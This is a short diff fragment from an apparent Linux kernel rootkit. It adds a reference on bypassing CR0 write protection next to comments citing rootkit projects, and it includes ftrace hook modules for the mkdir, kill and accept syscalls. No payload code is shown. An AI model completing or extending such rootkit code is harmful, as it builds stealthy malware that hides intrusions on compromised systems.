@@ -1,10 +1,12 @@
 //https://xcellerator.github.io/posts/linux_rootkits_11/
 //https://github.com/m0nad/Diamorphine
 //https://github.com/h3xduck/Umbra
+//https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html
 #include "ftrace_hook.h"
 #include "mkdir_hook.c"
 #include "kill_hook.c"
 #include "accept_hook.c"
+
 
 
 static struct ftrace_hook hooks[] = {
